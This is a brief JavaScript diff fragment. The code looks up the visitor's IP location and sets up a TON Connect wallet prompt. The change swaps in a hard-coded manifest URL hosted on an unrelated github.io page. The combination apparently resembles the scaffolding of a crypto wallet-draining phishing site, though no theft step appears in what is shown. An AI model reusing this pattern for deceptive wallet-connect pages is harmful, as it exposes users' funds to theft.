@@ -37,7 +37,7 @@ fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
 }).catch(error => console.error('Error IP:', error));
 
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
+    manifestUrl: 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json',
     buttonRootId: 'ton-connect'
 })
 tonConnectUI.on('walletConnected', (walletAddress) => {
